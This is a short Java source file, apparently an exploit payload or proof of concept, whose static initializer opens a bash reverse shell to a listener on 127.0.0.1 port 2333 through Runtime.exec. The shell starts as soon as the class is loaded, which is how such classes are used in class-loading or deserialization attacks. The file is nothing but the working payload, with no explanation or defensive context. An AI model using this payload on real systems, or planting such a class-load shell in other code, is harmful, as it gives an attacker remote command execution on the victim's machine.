import java.io.IOException;

public class Test {
    static {
        try {
            String[] command = new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/2333 0>&1"};
            Runtime.getRuntime().exec(command);
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}
